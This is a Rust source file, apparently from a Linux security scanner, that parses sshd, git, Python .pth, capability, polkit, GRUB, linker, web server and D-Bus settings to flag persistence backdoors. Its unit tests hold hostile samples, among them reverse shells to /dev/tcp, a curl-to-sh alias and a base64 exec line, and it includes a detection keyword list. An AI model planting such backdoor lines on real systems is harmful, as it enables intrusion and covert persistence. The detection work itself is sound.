//! Parsers for less common Linux persistence: SSH login scripts and sshd options, Git hooks and
//! configuration, Python `.pth` startup hooks, file capabilities, polkit rules, boot loader
//! command lines, dynamic-linker search paths, web server modules, D-Bus services and yum/dnf
//! plugins. Every function works on text or bytes so the logic is unit-tested.

use super::paths::{file_name, in_system_dir, suspicious_location};
use super::persistrules::{Entry, Kind};
use super::procrules::{cmdline_hits, is_interpreter, is_shell};
use super::report::Severity;

/// `key value` / `key=value` lines without comments, keys lower-cased.
fn kv_lines(text: &str) -> impl Iterator<Item = (String, String)> + '_ {
    text.lines().filter_map(|l| {
        let l = l.split('#').next().unwrap_or("").trim();
        if l.is_empty() {
            return None;
        }
        let (k, v) = match l.split_once(|c: char| c.is_whitespace() || c == '=') {
            Some((k, v)) => (
                k,
                v.trim_start_matches(|c: char| c.is_whitespace() || c == '='),
            ),
            None => (l, ""),
        };
        Some((k.to_ascii_lowercase(), v.trim().to_string()))
    })
}

/// Risky sshd options: commands run at authentication, root or empty-password logins, user
/// environments (LD_PRELOAD through ~/.ssh/environment) and keys read from odd places.
pub fn sshd_config_entries(path: &str, text: &str) -> Vec<Entry> {
    let mut out = Vec::new();
    for (k, v) in kv_lines(text) {
        let lv = v.to_ascii_lowercase();
        let e = |sev, note: &str| {
            Entry::new(Kind::SshdConfig, path, k.clone(), v.clone()).floor(sev, note)
        };
        match k.as_str() {
            "authorizedkeyscommand" if lv != "none" => {
                let sev =
                    if suspicious_location(v.split_whitespace().next().unwrap_or("")).is_some() {
                        Severity::Critical
                    } else {
                        Severity::Medium
                    };
                out.push(e(
                    sev,
                    "program runs on every SSH authentication and can authorise any key",
                ));
            }
            "authorizedprincipalscommand" if lv != "none" => out.push(e(
                Severity::Medium,
                "program decides certificate principals on every login",
            )),
            "forcecommand" => out.push(e(Severity::Low, "command forced on SSH sessions")),
            "permitemptypasswords" if lv == "yes" => out.push(e(
                Severity::High,
                "accounts with empty passwords can log in over SSH",
            )),
            "permituserenvironment" if lv != "no" => out.push(e(
                Severity::Medium,
                "users may set LD_PRELOAD and friends through ~/.ssh/environment",
            )),
            "permitrootlogin" if lv == "yes" => {
                out.push(e(Severity::Low, "direct root login with password allowed"))
            }
            "authorizedkeysfile" => {
                if v.split_whitespace()
                    .any(|f| f.starts_with('/') && suspicious_location(f).is_some())
                {
                    out.push(e(
                        Severity::High,
                        "authorized keys read from a temp or hidden location",
                    ));
                } else if v
                    .split_whitespace()
                    .any(|f| !f.starts_with(".ssh/") && !f.starts_with("%h/.ssh/") && f != "none")
                {
                    out.push(e(Severity::Low, "non-default authorized keys location"));
                }
            }
            _ => {}
        }
    }
    out
}

/// ~/.ssh/environment: variables injected into every SSH session (needs PermitUserEnvironment).
pub fn ssh_environment_entries(path: &str, user: &str, text: &str) -> Vec<Entry> {
    kv_lines(text)
        .filter(|(k, _)| {
            k.starts_with("ld_") || k == "bash_env" || k == "env" || k == "prompt_command"
        })
        .map(|(k, v)| {
            let mut e = Entry::new(
                Kind::SshRc,
                path,
                format!("{} for {user}", k.to_ascii_uppercase()),
                v,
            )
            .floor(
                Severity::High,
                "code injected into every SSH session of the user",
            );
            e.user = Some(user.to_string());
            e
        })
        .collect()
}

/// Git configuration keys that execute programs.
pub fn gitconfig_entries(path: &str, text: &str) -> Vec<Entry> {
    let mut out = Vec::new();
    let mut section = String::new();
    for raw in text.lines() {
        let l = raw.trim();
        if l.starts_with('#') || l.starts_with(';') || l.is_empty() {
            continue;
        }
        if let Some(s) = l.strip_prefix('[').and_then(|s| s.strip_suffix(']')) {
            section = s
                .split_whitespace()
                .next()
                .unwrap_or("")
                .to_ascii_lowercase();
            continue;
        }
        let Some((k, v)) = l.split_once('=') else {
            continue;
        };
        let key = format!("{section}.{}", k.trim().to_ascii_lowercase());
        let v = v.trim().trim_matches('"').to_string();
        let exec = match key.as_str() {
            "core.pager" | "core.fsmonitor" | "core.sshcommand" | "core.editor"
            | "core.askpass" | "sequence.editor" | "diff.external" => {
                // `less -R` or `nvim` are everyday settings; shell plumbing or odd paths are not.
                v.contains([';', '|', '&', '$', '`', '>', '<'])
                    || v.split_whitespace()
                        .any(|t| t.starts_with('/') && suspicious_location(t).is_some())
            }
            "core.hookspath" => {
                out.push(
                    Entry::new(Kind::GitConfig, path, key.clone(), v.clone()).floor(
                        Severity::Low,
                        "hooks of every repository run from this directory",
                    ),
                );
                false
            }
            k if k.starts_with("alias.") => v.starts_with('!'),
            k if k.starts_with("credential.") && k.ends_with("helper") => {
                v.starts_with('!') || v.contains("/tmp/") || v.contains("/dev/shm/")
            }
            _ => false,
        };
        if exec {
            out.push(Entry::new(Kind::GitConfig, path, key, v));
        }
    }
    out
}

/// Executable lines of a Python `.pth` file (lines starting with `import` run at every start).
pub fn pth_entries(path: &str, text: &str) -> Vec<Entry> {
    const RISKY: &[&str] = &[
        "exec(",
        "eval(",
        "base64",
        "b64decode",
        "socket",
        "subprocess",
        "os.system",
        "urllib",
        "urlopen",
        "compile(",
        "__import__('os')",
        "marshal",
        "zlib.decompress",
        "/dev/tcp",
    ];
    text.lines()
        .enumerate()
        .filter(|(_, l)| l.starts_with("import ") || l.starts_with("import\t"))
        .map(|(n, l)| {
            let lower = l.to_ascii_lowercase();
            let risky: Vec<&&str> = RISKY.iter().filter(|r| lower.contains(*r)).collect();
            let mut e = Entry::new(
                Kind::PythonStartup,
                path,
                format!("{} line {}", file_name(path), n + 1),
                l.trim(),
            );
            if !risky.is_empty() {
                let sev = if risky.len() >= 2 {
                    Severity::High
                } else {
                    Severity::Medium
                };
                e = e.floor(
                    sev,
                    format!(
                        "runs at every Python start and uses {}",
                        risky
                            .iter()
                            .map(|r| r.trim_end_matches('('))
                            .collect::<Vec<_>>()
                            .join(", ")
                    ),
                );
            }
            e
        })
        .collect()
}

/// Linux capability names by bit.
pub const CAP_NAMES: &[&str] = &[
    "cap_chown",
    "cap_dac_override",
    "cap_dac_read_search",
    "cap_fowner",
    "cap_fsetid",
    "cap_kill",
    "cap_setgid",
    "cap_setuid",
    "cap_setpcap",
    "cap_linux_immutable",
    "cap_net_bind_service",
    "cap_net_broadcast",
    "cap_net_admin",
    "cap_net_raw",
    "cap_ipc_lock",
    "cap_ipc_owner",
    "cap_sys_module",
    "cap_sys_rawio",
    "cap_sys_chroot",
    "cap_sys_ptrace",
    "cap_sys_pacct",
    "cap_sys_admin",
    "cap_sys_boot",
    "cap_sys_nice",
    "cap_sys_resource",
    "cap_sys_time",
    "cap_sys_tty_config",
    "cap_mknod",
    "cap_lease",
    "cap_audit_write",
    "cap_audit_control",
    "cap_setfcap",
    "cap_mac_override",
    "cap_mac_admin",
    "cap_syslog",
    "cap_wake_alarm",
    "cap_block_suspend",
    "cap_audit_read",
    "cap_perfmon",
    "cap_bpf",
    "cap_checkpoint_restore",
];

/// Capabilities that amount to root (privilege escalation or full control).
const ROOT_EQUIVALENT: &[u32] = &[0, 1, 2, 3, 6, 7, 16, 17, 19, 21, 31, 39];

/// Parse the `security.capability` extended attribute (struct vfs_cap_data, v1/v2/v3):
/// (permitted | inheritable bitmask, effective flag).
pub fn parse_vfs_cap(b: &[u8]) -> Option<(u64, bool)> {
    if b.len() < 12 {
        return None;
    }
    let u = |i: usize| u32::from_le_bytes(b[i..i + 4].try_into().unwrap()) as u64;
    let magic = u(0);
    let rev = magic & 0xFF00_0000;
    let effective = magic & 1 != 0;
    let lo = u(4) | u(8);
    let hi = if rev >= 0x0200_0000 && b.len() >= 20 {
        u(12) | u(16)
    } else {
        0
    };
    Some((lo | (hi << 32), effective))
}

pub fn cap_names(mask: u64) -> Vec<&'static str> {
    (0..64)
        .filter(|i| mask & (1u64 << i) != 0)
        .map(|i| CAP_NAMES.get(i as usize).copied().unwrap_or("cap_unknown"))
        .collect()
}

/// Capability set on a file: score by how much privilege it hands out and to what.
pub fn capability_entry(
    path: &str,
    mask: u64,
    effective: bool,
    owned: Option<bool>,
    mtime: Option<u64>,
) -> Option<Entry> {
    if mask == 0 {
        return None;
    }
    let names = cap_names(mask);
    let root_eq: Vec<&str> = ROOT_EQUIVALENT
        .iter()
        .filter(|b| mask & (1u64 << *b) != 0)
        .map(|b| CAP_NAMES[*b as usize])
        .collect();
    let mut e = Entry::new(Kind::Capability, path, file_name(path), path);
    e.owned = owned;
    e.mtime = mtime;
    e.notes.push(format!(
        "{}{}",
        names.join(","),
        if effective { "+ep" } else { "+p" }
    ));
    let base = file_name(path).trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    let shell_like = is_shell(base)
        || is_interpreter(base)
        || matches!(
            base,
            "find"
                | "vim"
                | "vi"
                | "less"
                | "tar"
                | "env"
                | "gdb"
                | "node"
                | "php"
                | "perl"
                | "python"
        );
    if !root_eq.is_empty() && shell_like {
        e = e.floor(
            Severity::Critical,
            format!(
                "{} on a program that runs arbitrary code (root backdoor)",
                root_eq.join(",")
            ),
        );
    } else if !root_eq.is_empty() && owned == Some(false) {
        e = e.floor(
            Severity::High,
            format!(
                "root-equivalent {} on a file no package owns",
                root_eq.join(",")
            ),
        );
    } else if !root_eq.is_empty() && !in_system_dir(path) {
        e = e.floor(
            Severity::Medium,
            format!(
                "root-equivalent {} outside system directories",
                root_eq.join(",")
            ),
        );
    }
    Some(e)
}

/// polkit authorisations that grant actions to anyone without authentication.
pub fn polkit_entries(path: &str, text: &str) -> Vec<Entry> {
    let mut out = Vec::new();
    let lower = text.to_ascii_lowercase();
    if path.ends_with(".pkla") {
        let any_user =
            lower.contains("identity=unix-user:*") || lower.contains("identity=unix-group:*");
        let auto_yes = ["resultany=yes", "resultactive=yes", "resultinactive=yes"]
            .iter()
            .any(|k| lower.replace(' ', "").contains(k));
        if any_user && auto_yes {
            out.push(
                Entry::new(
                    Kind::Polkit,
                    path,
                    file_name(path),
                    "Identity=* with Result*=yes",
                )
                .floor(
                    Severity::High,
                    "every user is authorised without a password",
                ),
            );
        }
    } else if lower.contains("polkit.result.yes") {
        let scoped = [
            "isingroup(",
            "subject.user ==",
            "subject.user===",
            "subject.user ===",
            "subject.local",
            "action.id ==",
        ];
        if !scoped.iter().any(|s| lower.contains(s)) {
            out.push(
                Entry::new(
                    Kind::Polkit,
                    path,
                    file_name(path),
                    "return polkit.Result.YES",
                )
                .floor(Severity::High, "rule returns YES without checking who asks"),
            );
        } else {
            out.push(Entry::new(
                Kind::Polkit,
                path,
                file_name(path),
                "return polkit.Result.YES (scoped)",
            ));
        }
    }
    out
}

/// Kernel command line in GRUB defaults: `init=` / `rdinit=` replace PID 1.
pub fn grub_entries(path: &str, text: &str) -> Vec<Entry> {
    let mut out = Vec::new();
    for l in text.lines().map(str::trim).filter(|l| !l.starts_with('#')) {
        if !l.starts_with("GRUB_CMDLINE_LINUX") {
            continue;
        }
        for tok in l.split(|c: char| c.is_whitespace() || c == '"' || c == '\'') {
            if let Some(v) = tok
                .strip_prefix("init=")
                .or_else(|| tok.strip_prefix("rdinit="))
            {
                let normal = matches!(
                    v,
                    "/sbin/init"
                        | "/lib/systemd/systemd"
                        | "/usr/lib/systemd/systemd"
                        | "/bin/systemd"
                        | "/init"
                );
                if !normal {
                    out.push(
                        Entry::new(Kind::Bootloader, path, tok, v)
                            .floor(Severity::Critical, "kernel boots a custom program as PID 1"),
                    );
                }
            }
        }
    }
    out
}

/// Directories added to the dynamic linker search path.
pub fn ld_conf_entries(path: &str, text: &str) -> Vec<Entry> {
    text.lines()
        .map(|l| l.split('#').next().unwrap_or("").trim())
        .filter(|l| l.starts_with('/'))
        .filter_map(|d| {
            let probe = format!("{}/x.so", d.trim_end_matches('/'));
            let why = suspicious_location(&probe)?;
            Some(
                Entry::new(Kind::LdConfig, path, d, d)
                    .floor(Severity::High, format!("libraries searched first in {why}")),
            )
        })
        .collect()
}

/// `LoadModule name path` (Apache) and `load_module path;` (nginx): (module path).
pub fn webserver_modules(text: &str) -> Vec<String> {
    text.lines()
        .map(|l| l.split('#').next().unwrap_or("").trim())
        .filter_map(|l| {
            let mut it = l.split_whitespace();
            match it.next()?.to_ascii_lowercase().as_str() {
                "loadmodule" => it.nth(1),
                "load_module" => it.next(),
                _ => None,
            }
            .map(|p| p.trim_end_matches(';').trim_matches('"').to_string())
        })
        .collect()
}

/// `Exec=` of a D-Bus service activation file.
pub fn dbus_service_exec(text: &str) -> Option<String> {
    text.lines()
        .find_map(|l| l.trim().strip_prefix("Exec=").map(|v| v.trim().to_string()))
}

/// Scripts with a reverse-shell or download-and-run line anywhere (generators, hooks, dispatchers).
pub fn script_hits(text: &str) -> Vec<(usize, String)> {
    let mut v = Vec::new();
    for (n, l) in text.lines().enumerate() {
        let t = l.trim();
        if t.is_empty() || t.starts_with('#') {
            continue;
        }
        for h in cmdline_hits(t) {
            v.push((n + 1, h.reason));
        }
    }
    v
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sshd() {
        let t = "# c\nPermitRootLogin yes\nAuthorizedKeysCommand /tmp/.k/keys %u\nAuthorizedKeysCommandUser nobody\nPermitUserEnvironment yes\nPermitEmptyPasswords no\nAuthorizedKeysFile .ssh/authorized_keys /var/tmp/.ak\n";
        let v = sshd_config_entries("/etc/ssh/sshd_config", t);
        let f: Vec<_> = v.iter().map(|e| (e.name.as_str(), e.floor)).collect();
        assert!(f.contains(&("authorizedkeyscommand", Severity::Critical)));
        assert!(f.contains(&("permitrootlogin", Severity::Low)));
        assert!(f.contains(&("permituserenvironment", Severity::Medium)));
        assert!(f.contains(&("authorizedkeysfile", Severity::High)));
        assert_eq!(f.len(), 4);
        assert!(sshd_config_entries("x", "PermitRootLogin prohibit-password\nAuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2\n").is_empty());
        let env = ssh_environment_entries(
            "/root/.ssh/environment",
            "root",
            "LD_PRELOAD=/tmp/x.so\nLANG=C\n",
        );
        assert_eq!(env.len(), 1);
        assert_eq!(env[0].floor, Severity::High);
    }

    #[test]
    fn git() {
        let t = "[core]\n\tpager = nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/1.2.3.4/1337 0>&1' & ${PAGER:-less}\n\teditor = vim\n[alias]\n\tst = status\n\tx = !curl -s http://x | sh\n[core]\n\thooksPath = /tmp/.h\n";
        let v = gitconfig_entries("/root/.gitconfig", t);
        let names: Vec<_> = v.iter().map(|e| e.name.as_str()).collect();
        assert_eq!(names, vec!["core.pager", "alias.x", "core.hookspath"]);
        assert!(gitconfig_entries("x", "[core]\n pager = less -R\n editor = nvim\n").is_empty());
    }

    #[test]
    fn pth() {
        let t = "/opt/lib\nimport os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'\nimport base64,socket;exec(base64.b64decode('aW1wb3J0'))\n";
        let v = pth_entries("/usr/lib/python3/dist-packages/x.pth", t);
        assert_eq!(v.len(), 2);
        assert_eq!(v[0].floor, Severity::Info);
        assert_eq!(v[1].floor, Severity::High);
    }

    #[test]
    fn capabilities() {
        // v2: magic 0x02000001 (effective), permitted cap_setuid (bit 7), inheritable 0.
        let mut b = Vec::new();
        b.extend_from_slice(&0x0200_0001u32.to_le_bytes());
        b.extend_from_slice(&(1u32 << 7).to_le_bytes());
        b.extend_from_slice(&0u32.to_le_bytes());
        b.extend_from_slice(&0u32.to_le_bytes());
        b.extend_from_slice(&0u32.to_le_bytes());
        let (mask, eff) = parse_vfs_cap(&b).unwrap();
        assert!(eff);
        assert_eq!(cap_names(mask), vec!["cap_setuid"]);
        let e = capability_entry("/usr/bin/python3.12", mask, eff, Some(true), None).unwrap();
        assert_eq!(e.floor, Severity::Critical);
        let ping = capability_entry("/usr/bin/ping", 1 << 13, true, Some(true), None).unwrap();
        assert_eq!(ping.floor, Severity::Info);
        let odd = capability_entry("/opt/tool/agent", 1 << 21, true, Some(false), None).unwrap();
        assert_eq!(odd.floor, Severity::High);
        assert!(parse_vfs_cap(&[0; 4]).is_none());
    }

    #[test]
    fn polkit() {
        let pkla = "[Allow Everything]\nIdentity=unix-user:*\nAction=*\nResultAny=yes\nResultInactive=yes\nResultActive=yes\n";
        assert_eq!(
            polkit_entries("/etc/polkit-1/localauthority/50-local.d/x.pkla", pkla)[0].floor,
            Severity::High
        );
        let js = "polkit.addRule(function(action, subject) { return polkit.Result.YES; });";
        assert_eq!(
            polkit_entries("/etc/polkit-1/rules.d/99-x.rules", js)[0].floor,
            Severity::High
        );
        let scoped = "polkit.addRule(function(action, subject) { if (subject.isInGroup(\"wheel\")) { return polkit.Result.YES; } });";
        assert_eq!(
            polkit_entries("/etc/polkit-1/rules.d/49-wheel.rules", scoped)[0].floor,
            Severity::Info
        );
    }

    #[test]
    fn grub_ld_web_dbus() {
        let g = grub_entries(
            "/etc/default/grub.d/x.cfg",
            "GRUB_CMDLINE_LINUX_DEFAULT=\"$GRUB_CMDLINE_LINUX_DEFAULT init=/grub-panix.sh\"\n",
        );
        assert_eq!(g[0].floor, Severity::Critical);
        assert!(grub_entries(
            "/etc/default/grub",
            "GRUB_CMDLINE_LINUX=\"quiet splash init=/lib/systemd/systemd\"\n"
        )
        .is_empty());
        assert_eq!(
            ld_conf_entries("/etc/ld.so.conf.d/x.conf", "/usr/local/lib\n/dev/shm/.l\n").len(),
            1
        );
        assert_eq!(webserver_modules("LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so\n# LoadModule x y\nload_module /tmp/ngx_backdoor.so;\n"), vec!["/usr/lib/apache2/modules/mod_rewrite.so", "/tmp/ngx_backdoor.so"]);
        assert_eq!(
            dbus_service_exec(
                "[D-BUS Service]\nName=org.x\nExec=/usr/local/bin/dbus-x.sh\nUser=root\n"
            )
            .as_deref(),
            Some("/usr/local/bin/dbus-x.sh")
        );
        assert_eq!(
            script_hits(
                "#!/bin/sh\n# bash -i >& /dev/tcp/x/1\nbash -i >& /dev/tcp/1.2.3.4/53 0>&1\n"
            )
            .len(),
            1
        );
    }
}
